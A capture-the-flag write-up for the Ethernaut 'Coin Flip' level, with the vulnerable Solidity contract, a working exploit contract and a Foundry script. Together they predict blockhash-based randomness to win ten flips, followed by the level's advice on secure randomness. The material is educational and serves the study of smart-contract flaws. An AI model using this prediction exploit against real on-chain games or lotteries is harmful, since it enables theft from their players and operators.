# Level 3 - Coin Flip ⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/3" %}

### Level Setup

{% hint style="info" %}
This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/CoinFlip.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
{% endcode %}

### Exploit

This exploit is possible because the coinflip isn't random but deterministic. By copying the same logic that's used to determine the result and executing it in the same block just before guessing, you can guess correctly every time.

1. Run the same calculation and use the result to call the CoinFlip contract already deployed.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-3

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-3

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/src/Level3.sol" %}

{% code title="src/Level3.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

// ================================================================
// │                      LEVEL 3 - COIN FLIP                     │
// ================================================================
contract CoinFlipGuess {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(address _targetContractAddress) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return ICoinFlip(_targetContractAddress).flip(side);
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level3.s.sol" %}

{% code title="script/Level3.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {CoinFlipGuess} from "../src/Level3.sol";

interface ICoinFlip {
    function consecutiveWins() external returns (uint256);
}

// ================================================================
// │                      LEVEL 3 - COIN FLIP                     │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        ICoinFlip targetContract = ICoinFlip(targetContractAddress);

        if (targetContract.consecutiveWins() < 10) {
            vm.startBroadcast();

            CoinFlipGuess coinFlipGuess = new CoinFlipGuess();
            coinFlipGuess.flip(targetContractAddress);

            vm.stopBroadcast();
        } else {
            revert("Already won 10 times");
        }

        console.log("consecutiveWins: %s", targetContract.consecutiveWins());
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).
{% endhint %}

### Notes

* The real challenge is getting the script to run 10 times.
* This was hard to do in foundry with a real blockchian, but would have been easy to test on anvil simply by advancing the block by one then calling it again.

{% embed url="https://github.com/nvnx7/ethernaut-openzeppelin-hacks/blob/e936301859334383d568a614084917100319205e/level_3_Coin-Flip.md" %}
